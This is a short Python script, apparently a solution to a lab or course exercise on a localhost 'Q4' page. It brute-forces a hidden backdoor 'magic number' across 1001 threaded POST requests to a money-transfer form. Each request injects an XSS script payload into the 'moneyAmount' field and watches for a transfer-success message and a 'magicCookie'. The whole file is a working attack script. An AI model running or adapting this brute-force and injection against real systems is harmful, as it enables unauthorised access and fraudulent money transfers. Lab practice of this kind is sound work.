import requests
import threading




url = "http://localhost:2223/Q4"  # Replace with the URL of your Q4 page
i = 0
found_backdoor = False




def check_backdoor(magic_number):
    global found_backdoor
    payload = f"{magic_number} <script>alert('XSS Attack!');</script>"
    response = requests.post(url, data={"moneyAmount": payload}) # If moneyAmount doesn't work try username
   
    if "Money has been transfered!" in response.text:
        print(response.text)
        found_backdoor = True
        print(f"Found backdoor with magic number: {magic_number}")




threads = []
for magic_number in range(1, 1002):
    thread = threading.Thread(target=check_backdoor, args=(magic_number,))
    threads.append(thread)
    thread.start()




for thread in threads:
    thread.join()




if not found_backdoor:
    print("No exploit found")

#When code works ctrl+f for "magicCookie"